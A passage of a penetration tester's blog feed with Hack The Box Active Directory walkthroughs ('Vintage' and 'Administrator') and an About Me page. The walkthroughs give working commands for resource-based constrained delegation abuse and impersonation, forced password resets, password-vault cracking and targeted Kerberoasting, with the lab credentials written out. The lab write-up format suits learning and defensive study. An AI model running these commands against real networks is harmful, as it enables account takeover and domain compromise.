&lt;div class="w-100" >&lt;img src="./image-60.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo netexec ldap 10.10.11.45 -u C.Neri_adm -p Uncr4ck4bl3P4ssW0rd0312 -k --query &lt;span class="s2">&amp;#34;(sAMAccountName=C.Neri_adm)&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-61.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>The user C.Neri_adm is a member of DelegatedAdmins, Remote Desktop Users. Note here that, by default:&lt;/p>
&lt;p>The &lt;strong>Remote Desktop Users&lt;/strong> group does &lt;strong>not&lt;/strong> inherently grant WinRM access.&lt;br>
Which means we cant use &lt;strong>Evil-Winrm&lt;/strong> as &lt;strong>C.Neri_adm.&lt;/strong> If it would Be &lt;strong>Remote Login User&lt;/strong> than only it was possible but its &lt;strong>Remote Desktop User&lt;/strong> which means he can have &lt;strong>RDP&lt;/strong> but in this box RDP port is disabled so we cant use that which leads us to check &lt;strong>C.Neri_adm via bloodhound&lt;/strong>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-62.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="28-cneri_adm-bloodhound-">28. &lt;strong>C.NERI_ADM BLOODHOUND&lt;/strong> :&lt;/h2>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-63.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-64.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-65.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-66.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Since C.Neri_adm is not the service account so although he is a part of Delegatedadmins but in order to Abuse RBCD. We must have a SPN (ServicePrincipalName) otherwise KDC will report an error.&lt;/p>
&lt;h3 id="situation">Situation:&lt;/h3>
&lt;p>&lt;strong>Users with delegate flag do not have SPN, and users who can add SPN are not among delegatedadmins.&lt;/strong>&lt;/p>
&lt;h3 id="solution">Solution:&lt;/h3>
&lt;p>We can use &lt;strong>C.Neri_adm to add SPN&lt;/strong> to the serviceaccount, and then we can use this &lt;strong>serviceaccount&lt;/strong> to implement &lt;strong>RBCD ABUSE&lt;/strong> (this serviceaccount should be &lt;strong>svc_sql&lt;/strong>, because we only know its &lt;strong>password&lt;/strong>&lt;/p>
&lt;h2 id="29-setting-spn-for-the-svc_sql-">29. &lt;strong>SETTING SPN FOR THE SVC_SQL&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri_adm -p &lt;span class="s1">&amp;#39;Uncr4ck4bl3P4ssW0rd0312&amp;#39;&lt;/span> -k &lt;span class="nb">set&lt;/span> object &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span> servicePrincipalName  -v &lt;span class="s2">&amp;#34;cifs/fake&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-67.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-68.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We get an error of insufficient access rights. Means as a C.Neri_adm we cant set SPN for SVC_SQL.&lt;/p>
&lt;p>Earlier as a C.Neri, we saw this:&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-69.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>ServiceManagers have GenericAll over SVC_SQL. Since C.Neri is a member of ServiceManagers so he might have that same privilege which will allow us to set SPN for SVC_SQL&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri -p &lt;span class="s1">&amp;#39;Zer0the0ne&amp;#39;&lt;/span> -k &lt;span class="nb">set&lt;/span> object &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span> servicePrincipalName  -v &lt;span class="s2">&amp;#34;cifs/dc02.htb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-70.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="30-adding-svc_sql-to-the-delegatedadmins-group-via-cneri_adm-">30. &lt;strong>ADDING SVC_SQL TO THE DELEGATEDADMINS GROUP VIA C.NERI_ADM&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri_adm -p &lt;span class="s1">&amp;#39;Uncr4ck4bl3P4ssW0rd0312&amp;#39;&lt;/span> -k add groupMember &lt;span class="s2">&amp;#34;DELEGATEDADMINS&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-71.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="31-enabling-the-svc_sql-accountsince-it-was-disabled-when-checked-via-bloodhound-">31. &lt;strong>ENABLING THE SVC_SQL ACCOUNT(since it was disabled when checked via bloodhound)&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri -p &lt;span class="s1">&amp;#39;Zer0the0ne&amp;#39;&lt;/span> -k remove uac SVC_SQL -f ACCOUNTDISABLE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-72.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="32-obtaining-svc_sql-tgt-">32. &lt;strong>OBTAINING SVC_SQL TGT&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>export KRB5CCNAME=$PWD/'svc_sql.ccache'&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-73.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="33-rbcd-attack-with-sql_svc-tgt-">33. &lt;strong>RBCD ATTACK WITH SQL_SVC TGT&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getST -spn &lt;span class="s1">&amp;#39;cifs/dc01.vintage.htb&amp;#39;&lt;/span> -impersonate administrator -dc-ip 10.10.11.45 -k -no-pass &lt;span class="s1">&amp;#39;vintage.htb/svc_sql:Zer0the0ne&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-74.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We can use administrator cifs for an smb access but we cant use beyond that like wmiexec or any else semi interactive shell because the administrator is prohibited from accessing cifs. The same is true for DC01, but &lt;strong>L.Bianchi_adm&lt;/strong> can.&lt;/p>
&lt;p>So we need to impersonate as &lt;strong>L.Bianchi_adm&lt;/strong>.&lt;/p>
&lt;p>Why &lt;strong>L.Bianchi_adm&lt;/strong> ?&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-75.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-76.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>That’s why!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getST -spn &lt;span class="s1">&amp;#39;cifs/dc01.vintage.htb&amp;#39;&lt;/span> -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k -no-pass &lt;span class="s1">&amp;#39;vintage.htb/svc_sql:Zer0the0ne&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$PWD&lt;/span>/&lt;span class="s1">&amp;#39;L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-77.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-78.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="34-access-via-wmiexec-">34. &lt;strong>ACCESS VIA WMIEXEC&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-79.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-80.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="alhamdulillah">ALHAMDULILLAH&lt;/h3>
&lt;h5 id="rooted">#ROOTED&lt;/h5></description></item><item><title>About Me</title><link>http://localhost:1313/about/</link><pubDate>Mon, 05 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/about/</guid><description>&lt;p>I&amp;rsquo;m a Penetration Tester with over two years of hands-on experience in offensive security. I specialize in proactively identifying and mitigating vulnerabilities before they can be exploited by threat actors.&lt;/p>
&lt;p>With a background in Computer Engineering and certifications including &lt;strong>OSCP+&lt;/strong> and &lt;strong>OSCP&lt;/strong>, I’ve spent hundreds of hours in OffSec Proving Grounds and regularly engage in realistic attack simulations on &lt;a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box&lt;/a>, where I rank among the top performers. My work is driven by a passion for continuous learning, offensive research, and real-world threat emulation.&lt;/p>
&lt;hr>
&lt;h3 id="-core-skill-set">🔐 Core Skill Set&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Penetration Testing&lt;/strong>: Skilled in assessing web applications, internal networks, Active Directory environments, and thick clients.&lt;/li>
&lt;li>&lt;strong>Red Teaming&lt;/strong>: Focused on adversary simulation, lateral movement, privilege escalation, and living-off-the-land (LOLBAS) techniques.&lt;/li>
&lt;li>&lt;strong>CTFs &amp;amp; Labs&lt;/strong>: Actively involved in Hack The Box sharpening practical skills in gamified and enterprise-like environments.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-outside-the-shell">⚙️ Outside the Shell&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Fitness Training&lt;/strong>: Consistent physical training fuels mental performance — part of my daily routine.&lt;/li>
&lt;li>&lt;strong>Technical Blogging&lt;/strong>: I write about penetration testing techniques, attack paths, and certification prep — content coming soon.&lt;/li>
&lt;li>&lt;strong>OSINT Enthusiast&lt;/strong>: Passionate about reconnaissance — sometimes even on myself.&lt;/li>
&lt;li>&lt;strong>Football Passion&lt;/strong>: Great passion of this sport — both on the screen and on the pitch.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-current-focus-areas">🎯 Current Focus Areas&lt;/h3>
&lt;ul>
&lt;li>Active Directory attacks &amp;amp; defenses&lt;/li>
&lt;li>Cloud security (AWS, Azure)&lt;/li>
&lt;li>Binary exploitation &amp;amp; reverse engineering&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>📬 &lt;em>Always open to connect, collaborate, or chat about infosec.&lt;/em>&lt;/p></description></item><item><title>Administrator</title><link>http://localhost:1313/blog/administrator-htb/</link><pubDate>Mon, 05 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/administrator-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
ADMINISTRATOR-HTB-ACTIVE DIRECTORY
&lt;/div>
&lt;h2 id="1-nmap-scan">1. NMAP-SCAN:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -p- -sV -sC --open -oN nmap-administrator Target-IP
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img alt="" srcset="
/blog/administrator-htb/1-Administrator_hu1989788176023874794.webp 400w,
/blog/administrator-htb/1-Administrator_hu17992487573682762244.webp 760w,
/blog/administrator-htb/1-Administrator_hu3923997780253804761.webp 1200w"
src="http://localhost:1313/blog/administrator-htb/1-Administrator_hu1989788176023874794.webp"
width="760"
height="500"
loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Since initial access was given as :-
&lt;em>Username:&lt;/em> &lt;strong>Olivia&lt;/strong>
&lt;em>Password:&lt;/em> &lt;strong>ichliebedich&lt;/strong>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="2-bloodhound">2. BLOODHOUND:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo bloodhound-python -u &lt;span class="s2">&amp;#34;olivia&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;ichliebedich&amp;#34;&lt;/span> -d administrator.htb -c all --zip -ns 10.10.11.42
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Check Olivia&amp;rsquo;s Outbound Object Control:&lt;/strong>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>It can be seen that the user olivia has GenericAll over Michael. Means we can change the password of Michael as Olivia.&lt;/p>
&lt;h2 id="3-rpclientnet-rpc">3. RPCLIENT/NET RPC:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rpcclient -N  10.10.11.42 -U administrator.htb/&lt;span class="s1">&amp;#39;olivia%ichliebedich&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">setuserinfo michael &lt;span class="m">23&lt;/span> Password123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div style="text-align: center; font-size: 1.5em; font-weight: bold; color: Golden;">
OR
&lt;/div>
&lt;p>We could:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net rpc password michael Password123 -U administrator.htb/&lt;span class="s1">&amp;#39;olivia%ichliebedich&amp;#39;&lt;/span> -S administrator.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-2.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>This time checking Michael Outbound Object Controls:&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-3.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>It can be seen that the user Michael has &lt;strong>ForceChangePassword&lt;/strong> over Benjamin. Means we can change the password of Michael as Benjamin.&lt;/p>
&lt;p>Time to change Benjamin password.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net rpc password benjamin Password123 -U administrator.htb/michael%Password123 -S administrator.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Although we changed the password of Benjamin but we cant access Benjamin as Evil-Winrm since he doesn’t have a winrm access. Moreove, wmiexec and psexec also didn’t worked.&lt;/p>
&lt;h2 id="3-ftp-as-benjamin">3. FTP AS BENJAMIN:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lftp -u administrator.htb&lt;span class="se">\\&lt;/span>benjamin,Password123! 10.10.11.42
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-5.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dir
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">get Backup.psafe3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-6.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;blockquote>
&lt;p>The file is pwsafe format so for that we need to first change it into .txt via pwsafe2john then crack it via john&lt;/p>
&lt;/blockquote>
&lt;h2 id="4-cracking-the-pwsafe-file">4. CRACKING THE PWSAFE FILE:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">pwsafe2john Backup.psafe3 &amp;gt; pwhash.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-7.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">john --format&lt;span class="o">=&lt;/span>pwsafe pwhash.txt --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-8.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-9.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>PASSWORD FOR BACKUP FILE: &lt;strong>tekieromucho&lt;/strong>&lt;/p>
&lt;h2 id="5-access-backuppsafe3-via-pwsafe">5. ACCESS BACKUP.PSAFE3 VIA PWSAFE:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt install passwordsafe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pwsafe Backup.psafe3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-10.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-11.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-12.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h5 id="we-got-3-users-with-there-passwords-time-to-again-check-bloodhound-for-the-high-target-user">We got 3 users with there passwords. Time to again check bloodhound for the High Target User&lt;/h5>
&lt;h2 id="5-bloodhound-again">5. BLOODHOUND AGAIN:&lt;/h2>
&lt;ul>
&lt;li>Check Emily&lt;/li>
&lt;li>Outbound Object Control&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-13.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;blockquote>
&lt;p>Emily has GenericWrite Access over Ethan&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>Ethan is a High Value Target&lt;/p>
&lt;/blockquote>
&lt;p>Lets Check the Analysis Tab.&lt;/p>
&lt;ul>
&lt;li>Find Shortest Path to Domain Admins&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-14.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h4 id="question--1-what-is-genericwrite-access-means-">QUESTION # 1: WHAT IS &lt;em>GENERICWRITE ACCESS&lt;/em> MEANS ?&lt;/h4>
&lt;p>&lt;code>Permission that allows a subject (user, process, or application) to perform write operations (modify, create, delete) on a resource (file, database, object, etc.) without specific restrictions.&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-15.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h4 id="question--2-how-to-abuse-it-">QUESTION # 2: HOW TO ABUSE IT ?&lt;/h4>
&lt;p>We have some options for it.&lt;/p>
&lt;ol>
&lt;li>&lt;strong>Shadow Credentials&lt;/strong>&lt;/li>
&lt;li>&lt;strong>TargetedKerberoast&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-16.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We are using the 2nd option which is targetedKerberoast.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ./targetedKerberoast.py -v -d &lt;span class="s1">&amp;#39;administrator.htb&amp;#39;&lt;/span> -u &lt;span class="s1">&amp;#39;EMILY&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#39;&lt;/span> --dc-ip 10.10.11.42
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-17.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;em>FOR KERBEROAST TO WORK WE NEED TO HAVE THE SAME DATE AND TIME AS OF THE TARGET. FOR THAT WE CAN USE NTPUPDATE OR MANUALLY CHANGE TIME VIA SMBCLIENT WITH ACCESS&lt;/em>&lt;/p>
&lt;h2 id="6-ntpupdate">6. NTPUPDATE:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt install ntpdate -y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mousepad /etc/ntp.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>server 10.10.11.42&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-18.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ntpdate 10.10.11.42
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-19.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div style="text-align: center; font-size: 1.5em; font-weight: bold; color: Golden;">
OR
&lt;/div>
&lt;h5 id="via-smbclient">VIA SMBCLIENT:&lt;/h5>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient -L 10.10.11.42 -U &lt;span class="s1">&amp;#39;EMILY%UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Manually set your system time:&lt;/strong> Once you know the DC&amp;rsquo;s time, manually set your machine&amp;rsquo;s time using:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo date -s &lt;span class="s2">&amp;#34;YYYY-MM-DD HH:MM:SS&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="7-attacking-via-targetedkerberoastpy">7. ATTACKING VIA TARGETEDKERBEROAST.PY:&lt;/h2>
